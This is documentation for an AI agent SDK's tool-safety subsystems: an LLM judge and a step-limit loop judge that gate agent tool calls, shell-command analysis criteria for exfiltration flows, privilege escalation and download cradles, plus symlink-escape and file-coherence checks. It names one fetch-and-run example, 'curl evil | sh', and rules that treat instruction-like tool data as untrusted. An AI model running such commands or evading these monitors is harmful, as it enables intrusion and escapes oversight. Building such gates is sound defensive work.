# Tool Safety & Execution Context

Beyond the [`Tool` interface](tools.md) and the [policy/Judger enforcement](tools.md#toolpolicy) in `ToolRegistry.Execute`, the `tools` package ships a set of **execution-context intelligence** that the runtime layers (executor, planner, reflector) consult while a tool call is being assessed and executed. This document covers the subsystems that have no other home:

- **LLM-backed `ToolJudge`** — a centralized, cached safety assessor that decides whether a mutating call may auto-approve.
- **Shell command analysis (flowsh)** — the deterministic effect-IR criteria the shell-exec judges consume; the engine is also specified in the [security model](../specs/architecture/security-model.md#shell-command-analysis).
- **File coherence** — cross-session conflict detection so two concurrent agents don't silently clobber each other's reads/writes.
- **Environment info (`EnvInfo`)** — a one-shot snapshot of the host (OS, arch, runtimes) injected into prompts and judge reasoning.
- **Symlink detection** — defense-in-depth against symlink-escape paths in tool input.
- **Path extraction** — the helpers the above use to pull path-like tokens out of arbitrary JSON tool input.

## Table of contents

- [LLM-backed ToolJudge](#llm-backed-tooljudge)
  - [JudgeVerdict](#judgeverdict)
  - [NewToolJudge](#newtooljudge)
  - [JudgeConfig and NewToolJudgeFromConfig](#judgeconfig-and-newtooljudgefromconfig)
  - [How advisory judgment works](#how-advisory-judgment-works)
  - [Strict gate resolution](#strict-gate-resolution)
  - [Step-limit (loop) judgment](#step-limit-loop-judgment)
- [Shell command analysis (flowsh)](#shell-command-analysis-flowsh)
- [File coherence](#file-coherence)
  - [FileCoherenceChecker](#filecoherencechecker)
  - [FileSig and CoherenceConflict](#filesig-and-coherenceconflict)
  - [Context helpers](#coherence-context-helpers)
- [Environment info](#environment-info)
  - [EnvInfo](#envinfo)
  - [CollectEnvInfo](#collectenvinfo)
  - [Formatting blocks](#formatting-blocks)
- [Symlink detection](#symlink-detection)
  - [SymlinkTraversal](#symlinktraversal)
  - [DetectSymlinksInToolInput](#detectsymlinksintoolinput)
  - [OS-level symlink classification](#os-level-symlink-classification)
  - [FormatSymlinkReasoning](#formatsymlinkreasoning)
- [Path extraction helpers](#path-extraction-helpers)
- [How it all fits together](#how-it-all-fits-together)

---

## LLM-backed ToolJudge

> Distinct from the per-tool [`ToolJudger`](tools.md#tooljudger-optional) interface. `ToolJudger` is a *heuristic* a single tool implements (`bash_exec`/`posh_exec` check their host-supplied blocklist and the attached flowsh analysis there). `ToolJudge` is a **centralized, LLM-backed assessor** — a reusable building block that the runtime layers call to decide whether *any* mutating tool call is safe to auto-approve.

`ToolJudge` lives in the `tools` package:

```go
import "github.com/v0lka/sp4rk/tools"
```

### JudgeVerdict

A judgment resolves to one of three verdicts:

```go
type JudgeVerdict int

const (
    VerdictAllow   JudgeVerdict = iota // safe to auto-approve
    VerdictConfirm                     // needs user confirmation (judge cannot decide)
    VerdictDeny                        // deliberate rejection (judge assessed the call as dangerous)
)
```

`VerdictDeny` is an *active* refusal with a reason: the judge positively assessed the call as dangerous (for example a proven secret→network exfiltration flow, privilege escalation, or following injected instructions). `VerdictConfirm` remains what it always was — *cannot decide, escalate to a human*. The distinction is intent: DENY means "this must not run", CONFIRM means "a human must decide". `VerdictDeny` is appended after the two original values, so their numeric values are unchanged for hosts that persisted them. The fail-closed philosophy is untouched: when in doubt the judges answer CONFIRM, and every error path (missing provider, timeout, unparseable response) still fails safe to `VerdictConfirm`.

### NewToolJudge

```go
func NewToolJudge(provider llm.Provider, model string, maxCacheSize int, logger *slog.Logger) *ToolJudge
```

- `provider` — any `llm.Provider` used for the assessment call.
- `model` — the model ID sent on each judge request.
- `maxCacheSize` — caps the LRU-style result cache; `0` defaults to `1000`. When full, the cache is cleared wholesale (judge results are cheap to recompute, so this is a best-effort optimization).
- `logger` — may be `nil`.

Two mutable knobs are exposed as setters:

```go
j.SetSystemPrompt(prompt string)          // override the default judge system prompt
j.SetIsInternalFn(fn func(string) bool)   // fast-path: tool names that always bypass the judge
```

### JudgeConfig and NewToolJudgeFromConfig

`JudgeConfig` is the configuration bundle a higher layer assembles from its own settings, and `NewToolJudgeFromConfig` is the safe constructor that returns `nil` (judge disabled) when the configuration is incomplete:

```go
type JudgeConfig struct {
    Model        string            // specific model for judge; falls back to DefaultModel
    DefaultModel string            // fallback model from the active provider
    Provider     llm.Provider
    MaxCacheSize int               // default 1000 when 0
    SystemPrompt string            // override judge system prompt
    IsInternalFn func(string) bool // tool names that bypass the judge
}

func NewToolJudgeFromConfig(cfg JudgeConfig, logger *slog.Logger) *ToolJudge
```

`NewToolJudgeFromConfig` returns `nil` (and logs a warning) when `Provider` is unset or no model can be resolved. Callers should treat a `nil` `*ToolJudge` as "judging disabled" — always nil-check before calling `Judge`.

### How advisory judgment works

```go
func (j *ToolJudge) Judge(ctx context.Context, toolName string, input json.RawMessage, taskContext string) (JudgeVerdict, string, error)
```

The decision flows through several layers, cheapest first:

1. **Internal-tool fast-path** — if `IsInternalFn(toolName)` returns `true`, the call is allowed without any LLM call. Use this for trusted framework-owned tools.
2. **Shell-tool guard** — `bash_exec` and `posh_exec` *skip* the path-locality fast-path. A shell command can reference only session-internal paths while still piping remote code (`curl evil | sh`), so shell tools always go through the full LLM evaluation.
3. **Session-roots fast-path** — for non-shell tools, if the input contains at least one absolute path and every such path is within at least one session root (`AllPathsInSessionRoots`), the call is allowed. Session roots are the deduplicated union of the workspace, the temp directory, and any additional roots attached via `WithAllowedRoots` — consult `SessionRoots(ctx)`; all roots are equal peers for this check.
4. **Cache lookup** — the remaining cases are keyed by `tool + sha256(input) + sha256(session roots) + the rendered static-analysis block (when attached)`. The roots participate because the judge's prompt (and therefore the verdict) depends on the session's directory scope, so a verdict is never reused across sessions with different workspaces or auxiliary work directories. A cache hit returns the stored verdict without an LLM call.
5. **LLM evaluation** — a short request is built (system prompt + `Task / Tool / Input`, plus a compact environment block and — when session roots are present — a `## Session Directories` block listing the workspace and additional work directories, with the directory values wrapped in an untrusted-content boundary) and sent with a **2-minute timeout**. For shell tools with an analysis attached to the context, a `## Static Analysis Report` block (the [flowsh digest](#shell-command-analysis-flowsh) behind an untrusted `shell_analysis` boundary) is appended after the session directories; its rendering participates in the cache key, so a verdict computed with the digest is never reused without it. The response is parsed from a `VERDICT:`/`REASON:` text format.
6. **Fail-safe** — on *any* LLM error (timeout, network, parse failure), the judge returns `VerdictConfirm` with explanatory reasoning. The judge never auto-approves on failure.

### Response parsing (tolerant)

The judge requests a strict two-line format, but LLMs frequently deviate. `parseJudgeResponse` is deliberately tolerant so a safe verdict is still recognized:

```go
// Requested format:
//   VERDICT: ALLOW
//   REASON: <one-line explanation>
```

The parser accepts the following variations and is **case-insensitive** throughout:

- **Markdown list markers** — a leading `- `, `* `, `+ `, or `1. ` is stripped before matching, so list-style answers parse correctly.
- **`KEY:` / `KEY =` separators** — both colon and `=` are accepted after `VERDICT`/`REASON` (and the `REASONING` alias).
- **Single-line answers** — a `REASON`/`REASONING` key inlined in a `VERDICT` line value (e.g. `ALLOW — REASON: safe`) is extracted.
- **JSON objects** — models that emit `{"verdict":"ALLOW","reason":"…"}` (possibly embedded in prose) are parsed; a JSON value takes precedence over the surrounding text.
- **Fenced or quoted values** — surrounding backticks, code fences, or quotes around the verdict are ignored.

The verdict value is matched on **whole tokens** (case-insensitive), so `ALLOW` is recognized but a token merely *containing* `allow` (e.g. a path, argument, or the negated compound `DISALLOW`) is not. Only these whole tokens map to `VerdictAllow` (the set that bypasses confirmation): `ALLOW`, `ALLOWED`, `APPROVE`, `APPROVED`, `SAFE`. The deliberate-rejection set (`DENY`, `DENIED`, `BLOCK`, `BLOCKED`, `REJECT`, `DISALLOW`, `DISAPPROVE`) maps to `VerdictDeny` — negated compounds are listed explicitly so they can never be misread as their affirmative base. The confirm set (`CONFIRM`, `CONFIRMED`, `MANUAL`) and any unrecognized token map to `VerdictConfirm`. A response that cannot be parsed at all is a total parse failure — the fail-safe applies and the judge returns `VerdictConfirm`.

> **Tip:** the advisory verdict cache is keyed on `tool+input+session roots+the rendered static-analysis block (when attached)` — not on `taskContext`. If your `taskContext` changes the safety assessment of the same call, the cached verdict from a prior task within the same directory scope will be reused. Keep advisory prompts focused on the *intrinsic* safety of the input, not on transient task context.

### Strict gate resolution

`JudgeStrict` is the conservative API for attempting to resolve an existing user-confirmation gate automatically — a **soft** gate, or a **non-canonical hard** one such as the flowsh ⊤ limitation (see below):

```go
type StrictJudgeRequest struct {
    ToolName        string
    Input           json.RawMessage
    TaskContext     string
    ToolSource      string
    AnalysisContext string // optional: one-line flowsh digest for shell tools ("" omits the envelope field)
}

func (j *ToolJudge) JudgeStrict(
    ctx context.Context,
    request StrictJudgeRequest,
) (JudgeVerdict, string, error)
```

It differs deliberately from advisory `Judge`:

- every call reaches the LLM — there is no internal-tool bypass, session-root allow fast path, or verdict cache;
- the current task, tool source, input, compact environment, session directories, and — for shell tools, when the host attaches it — the flowsh digest (`AnalysisContext`, wrapped as untrusted content behind a `shell_analysis` boundary: evidence for the verdict, never instructions) are serialized into a structured JSON envelope;
- tool input and host-provided directory data are wrapped as untrusted content, and directory line separators are sanitized;
- the strict system prompt covers agentic risks and uses a three-verdict scale — `ALLOW` (no material risk), `DENY` (deliberate rejection: the call is dangerous and must not run), `CONFIRM` (cannot decide, defer to a human) — and the strict parser accepts exactly these three canonical tokens;
- request construction failure, a missing provider, timeout/provider failure, nil response, or an unparseable response all fail safe to `VerdictConfirm`;
- provider errors are not logged because they may echo sensitive tool arguments.

A strict allow verdict may resolve a scope-related **soft** escalation such as path containment, or a **non-canonical hard** one such as the flowsh ⊤ limitation (`command_unbounded_analysis`). It does not override a **hard** security control such as a shell blocklist match, a canonical flowsh criterion, or an SSRF finding; hosts use `ConfirmationRequest.JudgeSeverity` (and their canonical-code policy) to keep those gates manual. Strict results are intentionally never cached because the same tool input can have a different answer under a different task, source, environment, or session scope.

```go
verdict, reason, err := judge.JudgeStrict(ctx, tools.StrictJudgeRequest{
    ToolName:    req.ToolName,
    Input:       req.Input,
    TaskContext: currentTask,
    ToolSource:  req.ToolSource,
})
if err != nil || verdict != tools.VerdictAllow {
    // keep the existing confirmation gate. The verdict may be VerdictDeny
    // (judge rejects the call as dangerous — surface the reason) or
    // VerdictConfirm (judge cannot decide, or evaluation failed) — neither
    // bypasses the gate.
}
```

> **Migration note:** use `Judge` for advisory auto-approval where its documented fast paths and cache are acceptable. Use `JudgeStrict` only after a tool/policy has already requested confirmation, and only for an escalation a strict allow may clear — a soft gate or a non-canonical hard one; never a hard canonical control.

### Step-limit (loop) judgment

`JudgeStepLimit` is the autonomous counterpart to the human-facing `HITLHandler.OnStepLimit` ([hitl.md](hitl.md)): when an unattended run hits a step-budget or circuit-breaker boundary and there is no human to ask, the host can ask the loop judge instead:

```go
type StepLimitJudgeRequest struct {
    TaskContext   string                 // task description (tools.TaskContextFrom(ctx))
    PlanSnapshot  string                 // compact host-rendered plan/checklist progress ("" when no plan)
    CurrentStep   int                    // boundary position
    MaxSteps      int                    // effective budget (the step already granted)
    AbortCategory string                 // LoopBoundaryBudget or LoopBoundaryCircuitBreaker
    AbortReason   string                 // host's breaker-trigger description ("" for budget boundaries)
    RecentSteps   []StepLimitStepDigest  // last N steps, oldest first; Args/Result pre-truncated by the host
    Metrics       StepLimitMetrics        // cumulative quality counters (steps, calls, errors, aborts, ...)
}

func (j *ToolJudge) JudgeStepLimit(
    ctx context.Context,
    request StepLimitJudgeRequest,
) (LoopVerdict, string, error)
```

The verdict scale mirrors the HITL `StepLimitResponse` options:

| `LoopVerdict` | Meaning |
|---|---|
| `LoopVerdictDeny` | stop the run at the boundary — the **zero value**: an uninitialized, unknown, or unparseable decision never grants more work |
| `LoopVerdictAllowOnce` | grant exactly one more iteration |
| `LoopVerdictAllowMore` | grant a full additional step budget — budget trigger only; at a circuit-breaker boundary the executor treats it as a single reprieve (no extra budget), so prefer `AllowOnce` there |
| `LoopVerdictAllowAlways` | remove the step limit for the rest of the run |

Contract guarantees:

- **fail-closed**: a nil provider, provider error/timeout, nil response, or an unparseable response all return `LoopVerdictDeny` with an explanatory reasoning and a **nil** error — the caller stops the run without inventing a transport error;
- **never cached**: every boundary is evaluated against its own trajectory (same no-cache rule as `JudgeStrict`);
- **exact-token parsing**: the verdict is read from the mandated two-line `VERDICT:`/`REASON:` response, an embedded JSON object, or a bare token; prose that merely *contains* a verdict word is a parse failure and fails closed — only an explicit token may grant work;
- **untrusted-content envelope**: the task, plan snapshot, breaker reason, and recent-step digest are line-sanitized and wrapped in untrusted-content boundaries before entering the prompt, so instruction-like text in quoted tool data is read as data, not policy;
- provider errors are not logged because they may echo the request's tool arguments (same policy as `JudgeStrict`);
- the judge call is bounded by a 2-minute timeout and uses deterministic (`CallPurposeRouting`) sampling.

An unrecognized or empty `AbortCategory` is normalized to `LoopBoundaryCircuitBreaker`, so a host that forgets to classify a boundary biases the judge toward the stricter breaker semantics.

```go
verdict, reason, err := judge.JudgeStepLimit(ctx, tools.StepLimitJudgeRequest{
    TaskContext:   currentTask,
    PlanSnapshot:  planProgress,
    CurrentStep:   step,
    MaxSteps:      budget,
    AbortCategory: tools.LoopBoundaryCircuitBreaker,
    AbortReason:   breaker.TriggerReason,
    RecentSteps:   digestWindow,
    Metrics:       runMetrics,
})
if err != nil || verdict == tools.LoopVerdictDeny {
    // stop the run; reason explains the boundary decision.
}
// LoopVerdictAllowOnce/More/Always map onto the host's step-limit response
// handling exactly like the corresponding StepLimitResponse values.
```

> **Migration note:** `JudgeStepLimit` does not replace `HITLHandler.OnStepLimit` — a host with a human in the loop should keep using the HITL handler. The loop judge exists for unattended runs and is typically wired as the fallback when no handler (or no human) is available.

---

## Shell command analysis (flowsh)

`bash_exec`/`posh_exec` commands get a **deterministic structural analysis** before any LLM is consulted. The engine wraps [`github.com/v0lka/flowsh`](https://github.com/v0lka/flowsh) (AST-based; bash and PowerShell dialects) and maps its effect IR onto fixed-priority criteria:

```go
func AnalyzeShellCommandForJudge(ctx context.Context, toolName string, input json.RawMessage) (*ShellAnalysis, error)
func AnalyzeShellCommandForJudgeWithDialect(ctx context.Context, lang api.Lang, input json.RawMessage) (*ShellAnalysis, error)
func ShellAnalysisLangForTool(tool any, toolName string) (api.Lang, bool)
func WithShellAnalysis(ctx context.Context, analysis *ShellAnalysis, err error) context.Context
func ShellAnalysisFrom(ctx context.Context) (*ShellAnalysis, error)
func WithShellVarBindings(ctx context.Context, vars map[string]string) context.Context
func ShellVarBindingsFrom(ctx context.Context) map[string]string
func ShellJudgeOutcome(ctx context.Context, toolName string) JudgeOutcome
```

- `AnalyzeShellCommandForJudge` — runs the analysis once (dialect keyed by tool name; `bash_exec` → bash, `posh_exec` → PowerShell; anything else errors, fail-closed). Returns `ShellAnalysis{Digest, Outcome, Canonical}` where `Outcome` carries the winning criterion's `Allow` (true when nothing fired) and `Canonical` its canonicality.
- **Operator invocation overrides** change the syntax contract: when the host reconfigures a shell tool's launch wrapper, the tool name no longer implies the dialect. Resolve the dialect from the tool's DECLARED shell kind with `ShellAnalysisLangForTool` (the declared kinds come from `ParseShellKind`/`ShellInvocation`, `tools/shell_invocation.go`) and call `AnalyzeShellCommandForJudgeWithDialect` — passing the declared dialect rather than the tool name, so a bash-family wrapper on `posh_exec` (or vice versa) is analyzed in the right grammar.
- `WithShellAnalysis` / `ShellAnalysisFrom` — context attachment. The **host** precomputes the analysis exactly once per call and attaches it; the built-in shell tools' `Judge` then returns the winning outcome **verbatim** via `ShellJudgeOutcome` — it never recomputes. With nothing attached it degrades to an empty outcome (the Judge defers to the LLM judges); with an **error** attached it **fails closed** with the hard canonical `command_analysis_unavailable` reason.
- The **digest** (`sp4rk-shell-analysis/v3`: schemaVersion, lang, top/conservative, reason, commands, resolution, effects, score, exfiltration pairs (`exfilPairs`, a top-level array — not part of `score`), network data-flows (`cradleFlows`/`ingestFlows`, top-level arrays of source/sink effect keys), destructive classes, fired criteria, the workspace-scoped verification marker (positive ALLOW evidence for a `command_unbounded_analysis` escalation; never a criteria override), and the effect `signature` — the deterministic identity of the command's effect, used for verdict memoization) is stable JSON with no why-traces and no input echo. It is meant for judge prompts: `StrictJudgeRequest.AnalysisContext` (strict path) and the `## Static Analysis Report` block (advisory path) both render it behind an untrusted `shell_analysis` boundary.

### Criteria C1–C9 (fixed priority; all fired criteria recorded)

| # | Condition (structural facts only — never scores/grades) | Reason code | Severity | Canonical |
| --- | --- | --- | --- | --- |
| C1 | exfiltration pair: secret read → tainted network egress | `command_exfil_flow` | hard | yes |
| C2 | privilege-escalation effect (e.g. SUID install) | `command_privilege_escalation` | hard | yes |
| C3 | direct write/metadata on a system path (`/etc`, `/usr`, `/boot`, `/bin`, `/sbin`; Windows `c:\windows`, `c:\program files`, `c:\program files (x86)`, component-boundary matched) or a non-harmless raw device | `command_system_write` | hard | yes |
| C4 | destructive KB class D/E ∧ irreversible ∧ concrete write target outside the session roots | `command_destructive_outside_roots` | hard | yes |
| C5 | an established network→code-execution **cradle flow** — fetched content reaching a shell/interpreter (a pipe to `sh`, a sourced or process-substituted fetch, a command-substitution sink); keyed on the proven flow, never on a bare NetEgress/CodeExec co-occurrence | `command_download_cradle` | hard | yes |
| C6 | analyzer ⊤/conservative **without** a cradle flow, **or** an irreversible write whose target the analyzer could not resolve (⊤ target — e.g. abbreviated PowerShell parameters) | `command_unbounded_analysis` | hard | **no** |
| C7 | an established network→filesystem **ingest flow** — a download client (`curl -o`/`-O`, `wget -O`/default) wrote content it fetched to a file; a stdout fetch is not an ingest | `command_external_content_ingest` | hard | **no** |
| C8 | credential access without an exfil pair | `credential_access` | soft | — |
| C9 | direct FS effect outside the session roots — writes/metadata on a non-system path, and reads even of a system path (system writes/metadata are C3's; raw-device reads are exempt) | `outside_session_roots` (reused) | soft | — |

> **Operator note — C7 escalation surface.** C7 (`command_external_content_ingest`) fires on ANY established download→file ingest flow, so a routine `wget https://example.com/report.pdf` or `curl -O https://example.com/report.pdf` now escalates to confirmation (hard but non-canonical) under the default policy. This is deliberate fail-closed behavior on an arbitrary host; a strict judge may positively clear a benign ingest (a document fetched from its canonical publisher or preprint server, an official package registry), and a fetch that lands only on stdout is never an ingest.

Canonical marks reasons a host must never auto-override (hosts keying deterministic policy off `JudgeReasonCode` treat C1–C5 as never-clearable; C6/C7 are an analyzer limitation and a flow the strict judge may clear). The analyzer is process-global (KB loaded once behind a `sync.Once`) and safe for concurrent use; it never executes the analyzed command. Empty session roots disable the containment criteria C4/C9.

The engine deliberately does **not** ship blocklist patterns: the constructor-supplied regex list is host policy (c0wrk ships it empty and calls it the blocklist), and the structural criteria above are the dialect-aware floor. The judge prompts teach the digest semantics — `score.grade` is the inherent destructiveness of the command text (routine in-root `rm -rf build/` grades Critical — expected), `top`/`conservative` are analyzer limits, and nothing follows from the digest's absence.

---

## File coherence

The tool-result cache ([documented under the Executor](agent-executor.md#tool-result-cache)) avoids redundant work *within* a single run. **File coherence** solves a different, cross-session problem: when several agent sessions operate on the same workspace, one session can read a file, another can rewrite it, and the first session is now acting on stale data. The coherence checker tracks per-session file signatures and flags such conflicts.

```go
import "github.com/v0lka/sp4rk/tools"
```

### FileCoherenceChecker

```go
type FileCoherenceChecker interface {
    // CheckRead — has the file changed since this session last read it?
    // Always refreshes the session snapshot to the current on-disk state.
    // Returns nil on first read or when unchanged.
    CheckRead(ctx context.Context, path string) *CoherenceConflict

    // CheckWrite — has the file changed since this session last read it?
    // Does NOT refresh the snapshot; call RecordWrite after a successful write.
    // Returns nil if there was no prior read (new-file case).
    CheckWrite(ctx context.Context, path string) *CoherenceConflict

    RecordWrite(ctx context.Context, path string) // refresh snapshot + log the write
    RecordDelete(ctx context.Context, path string) // drop snapshots + log the delete
    PurgeSession(sessionID string)                 // called on session teardown

    Lock(path string)   // per-file mutex; hold across the check-then-act window
    Unlock(path string) // to eliminate TOCTOU races
}
```

The `Lock`/`Unlock` pair is important: a checker implementation exposes a per-path mutex so callers can hold it across the read-modify-write window and avoid a time-of-check/time-of-use race between two sessions.

The implementation is provided by the consuming application layer (e.g. the `core` package in a desktop app). The SDK only defines the contract.

### FileSig and CoherenceConflict

```go
type FileSig struct {
    ModTime time.Time
    Size    int64
}

type CoherenceConflict struct {
    Path        string
    LastReadSig FileSig
    CurrentSig  FileSig
    ModifiedBy  string    // session display name, or "external"
    ModifiedAt  time.Time // when the conflicting write occurred
}
```

`FileSig` is a lightweight proxy for content change (mtime + size) — no hashing required, so checks are cheap even on large files. A conflict is reported whenever the current on-disk signature differs from the session's last-read signature.

### Coherence context helpers

```go
func WithCoherence(ctx context.Context, checker FileCoherenceChecker) context.Context
func CoherenceFrom(ctx context.Context) FileCoherenceChecker // nil if none attached
```

The executor and built-in file tools consult `CoherenceFrom(ctx)`; if no checker is attached (CLI mode, tests), coherence checks are skipped and the tools behave as if single-session. The built-in file tools format a conflict into a human-readable warning/annotation via `formatReadConflict` / `formatWriteConflict` (internal helpers).

---

## Environment info

To cut down on trivial "what shell am I on?" tool calls, the runtime collects a one-shot environment snapshot at startup and injects it into prompts. Two granularities are offered: a full block for executor/planner system prompts, and a compact block for judge/reflector reasoning.

```go
import "github.com/v0lka/sp4rk/tools"
```

### EnvInfo

```go
type EnvInfo struct {
    OS            string // "macOS 15.4 (Darwin 24.4.0)", "Linux 6.1.0", "Windows 11"
    Arch          string // "arm64", "amd64"
    Shell         string // "/bin/zsh"
    HomeDir       string // "/Users/you"
    GoVersion     string // "1.23.1" or "" if absent
    NodeVersion   string
    PythonVersion string
    DotNetVersion string
    JavaVersion   string
    PhpVersion    string
}
```

### CollectEnvInfo

```go
func CollectEnvInfo() *EnvInfo
```

Probes the host once and returns a populated `EnvInfo`. Each external-process probe (OS version + each runtime version) runs **concurrently** with a **2-second timeout**, so worst-case latency is a single probe timeout rather than the sum of all probes. Any probe that fails (missing binary, timeout, non-zero exit) leaves its field empty — never an error.

### Formatting blocks

```go
type EnvFormatOptions struct {
    HideHomeDir bool // suppress the home-directory line (e.g. in CHAT/no-project mode)
}

func FormatFullEnvBlock(info *EnvInfo, opts EnvFormatOptions) string    // detailed
func FormatCompactEnvBlock(info *EnvInfo) string                        // OS + date + timezone only
```

`FormatFullEnvBlock` produces a `## Environment` block with OS, arch, shell, home dir (optional), date, timezone (e.g. `Europe/Moscow (UTC+3)`), and the detected runtimes. `FormatCompactEnvBlock` emits only OS, date, and timezone — enough context for safety reasoning without leaking workspace details. Both return `""` when `info` is nil.

Attach the snapshot to a context for downstream consumers (including the `ToolJudge`, which appends `FormatCompactEnvBlock` to its assessment request):

```go
ctx = tools.WithEnvInfo(ctx, tools.CollectEnvInfo())
// later:
info := tools.EnvInfoFrom(ctx) // nil if not attached
```

---

## Symlink detection

A symlinked path inside the workspace can resolve to a target far outside it. The runtime gates tool calls that traverse such links, separating **workspace-internal** traversals (benign) from **outside** ones (security-relevant). This is defense-in-depth on top of the containment checks performed by [`pathutil`](utilities.md).

```go
import "github.com/v0lka/sp4rk/tools"
```

### SymlinkTraversal

```go
type SymlinkTraversal struct {
    // Path that traverses a symlink, with the workspace-relative/absolute
    // path components and the resolved target. Used to build a confirmation
    // prompt or a reasoning string.
}
```

### DetectSymlinksInToolInput

```go
func DetectSymlinksInToolInput(ctx context.Context, toolName string, input, schema json.RawMessage, logger *slog.Logger) (
    inside []SymlinkTraversal,
    outside []SymlinkTraversal,
)
```

Extracts path-like tokens from the tool input (via the [path extraction helpers](#path-extraction-helpers)), resolves each to an absolute path, walks its symlink components, and partitions the traversals into `inside` (target stays within a session root) and `outside` (target escapes). The caller decides whether `outside` traversals warrant a confirmation gate.

`schema` is the tool's JSON input schema and drives **field-aware** extraction. When the schema declares recognizable path fields, only those fields are scanned, so content payloads (`edit_file` `old_string`/`new_string`, `write_file` `content`) are never mistaken for paths. When no schema is supplied (`nil`) or no path field is recognized, detection falls back to scanning **every** string value, preserving coverage for unconventional tools (pass the tool's real schema to gain the false-positive reduction). Obtain the schema from the `ToolDescriptor.InputSchema` / MCP tool metadata.

**Path-field naming convention.** A property is treated as a path field when it is string-typed (or untyped) and its name matches an exact name (`path`, `file`, `dir`, `directory`, `filepath`, `filename`, `cwd`, `root`, `working_directory`, `workdir`, `dest`, `destination`) or ends with a suffix (`_path`, `_dir`, `_directory`, `_file`, `_filepath`, `_root`). When a schema declares a recognized path field alongside *other* string-typed fields whose names do not follow the convention, those non-path fields are excluded from scanning and the omission is logged via `logger` (Warn level); if `logger` is `nil`, `slog.Default()` is used, so the omission is observable rather than silent. To ensure a path-carrying parameter is scanned, name it with one of the recognized names/suffixes.

Shell-exec commands (`bash_exec`, `posh_exec`) contribute only their **literal** paths: the bash branch parses with `mvdan.cc/sh` and extracts literal word fragments, the PowerShell branch tokenizes with quote-state tracking and comment skipping (a `$` outside single quotes makes the token dynamic, and dynamic tokens are skipped — they cannot name a literal path). Expansion-driven **suspicion is deliberately not assessed** here: dynamic constructs (`$var`, `$(cmd)`, backticks) are the domain of the deterministic [shell command analysis](#shell-command-analysis-flowsh), which the **host** attaches to the same call (`AnalyzeShellCommandForJudge` + `WithShellAnalysis`). The walk itself neither runs nor requires that analysis, so with nothing attached it surfaces literal paths only and escalates for nothing. The former `suspicious` return value and its `symlink_suspicious` escalation were removed (see [decision 006](../specs/decisions/006-symlink-walk-literal-paths-only.md)).

> **Migration note:** this is a compile-breaking API change. `DetectSymlinksInToolInput` now returns the two `SymlinkTraversal` slices only (no `suspicious` value) and `FormatSymlinkReasoning` no longer takes a `suspicious` argument. The exported extractors `ResolveShellPathTokens`, `UnresolvablePathTokens`, `PathsOutsideRoots`, `ExistingPaths`, and `ExistingOrAnchoredPaths`, and the `ShellKind` type with its `ShellBash`/`ShellPosh` constants — the last remnants of the shell tools' former static judge stages — were removed. Update callers to the literal-path contract and route dynamic-construct coverage through the **host-attached** shell analysis (`AnalyzeShellCommandForJudge` + `WithShellAnalysis`, see [shell command analysis](#shell-command-analysis-flowsh)); the removal is recorded in [decision 006](../specs/decisions/006-symlink-walk-literal-paths-only.md).

**Candidate filtering.** The path-extraction helpers apply `looksLikePath`, which rejects strings that are obviously content rather than paths: strings containing control characters (bytes below `0x20` or `0x7f`, which never appear in a real path) and strings longer than `maxPathCandidateLen` (4096, a conservative `PATH_MAX` bound). URLs with a scheme (`http://`, `file://`, …) are also filtered. During the component walk, invalid-path errors (`ENAMETOOLONG`, `ENOTDIR`, `EINVAL` — e.g. a code blob longer than `NAME_MAX` mistakenly joined onto the workspace) stop the walk **without** escalating, since such a candidate cannot be a symlink. Permission errors (`EACCES`) and symlink loops (`ELOOP`) still escalate.

### OS-level symlink classification

Many operating systems create symlinks as filesystem-mapping infrastructure (macOS `etc/tmp/var` → `/private/…`; the Linux `/usr` merge; the `/run` tmpfs migration; Windows `Documents and Settings` → `Users`). Traversing these is **not** a user-created, security-relevant action, so the gate must not nag the user about them:

```go
func IsWellKnownOSSymlink(symlinkPath string) bool        // in the well-known map
func IsOSLevelSymlink(symlinkPath string, roots ...string) bool
```

`IsOSLevelSymlink` returns `true` when the link is well-known *or* when it is an ancestor of one of the given root directories (`roots` = the session roots from `SessionRoots(ctx)`). Containment is evaluated against **all** roots, while the primary root — the workspace, `roots[0]` — drives OS-level symlink classification and the fail-closed escalation scope. The well-known list is a single source of truth in the `tools` package; both the SDK symlink walker and the consuming app's registry gate resolve through these functions, so the list is never duplicated.

### FormatSymlinkReasoning

```go
func FormatSymlinkReasoning(inside, outside []SymlinkTraversal) string
```

Turns the partitioned traversals into a single human-readable string for the confirmation prompt (e.g. `"This call traverses a symlink resolving outside the workspace: /ws/link → /etc/secrets"`).

---

## Path extraction helpers

The judge fast-paths and the symlink detector both need to pull path-like tokens out of arbitrary JSON tool input. These helpers do that:

```go
func ExtractPaths(s string) []string
func ExtractJSONStrings(data any) []string
func HasRelativeEscape(s string) bool
func AllPathsInDir(ctx context.Context, input json.RawMessage, dir string) bool
func AllPathsInWorkspace(ctx context.Context, input json.RawMessage) bool
func AllPathsInSessionRoots(ctx context.Context, input json.RawMessage) bool
```

- `ExtractPaths` — finds absolute POSIX-style and Windows drive-letter paths (`/usr/bin`, `C:\foo\bar`) in a string via a regex. A `/` that follows a path-component character is treated as a **separator inside a relative path** (e.g. the `/src` in `frontend/src/main.tsx`), not the start of an absolute one — so embedded relative paths are not misread as absolute escapes. Windows drive-letter alternatives (`C:\…`) start with a letter and are unaffected. Tokens that consist entirely of separators (`//`, `C:\\`) are skipped as shell-language artifacts.
- `ExtractJSONStrings` — recursively collects every string value from a `json.Unmarshal` result (maps, slices, strings).
- `HasRelativeEscape` — detects a `..` path segment inside relative text (`../foo`, `a/../../etc`), while ignoring ellipses and names such as `..config`. Containment checks fail closed when it returns true instead of letting relative escapes disappear from absolute-path extraction.
- `AllPathsInDir` — returns `true` only if the input contains **at least one** absolute path **and every** such path is within `dir` (via `pathutil.IsWithinPath`). Empty/`""` when there are no paths. Harmless special-device paths (`/dev/null`, `/dev/full`; `NUL` on Windows) are exempted via `IsHarmlessDevicePath` so they do not force a confirmation when they appear alongside in-root paths.
- `AllPathsInWorkspace` — `AllPathsInDir` bound to the workspace path from context.
- `AllPathsInSessionRoots` — the canonical containment check consulted by the judge fast-path: returns `true` only if the input contains at least one absolute path and every such path is within at least one session root (`SessionRoots(ctx)`, the union of workspace + temp directory + `WithAllowedRoots` roots). Harmless special-device paths are exempted via `IsHarmlessDevicePath`, so `/dev/null`/`/dev/full`/`NUL` do not force a confirmation.

These are the primitives behind the judge's "all paths inside a session root → auto-approve" fast-path.

---

## How it all fits together

These subsystems are intentionally decoupled and individually optional. A minimal CLI agent uses none of them — `CoherenceFrom`, `EnvInfoFrom`, and a `nil` `*ToolJudge` all degrade gracefully. A full desktop app wires them through the execution context to gain cross-session safety, prompt context, and centralized LLM-based assessment:

```go
// Assemble the execution context once per session/run.
envInfo := tools.CollectEnvInfo()

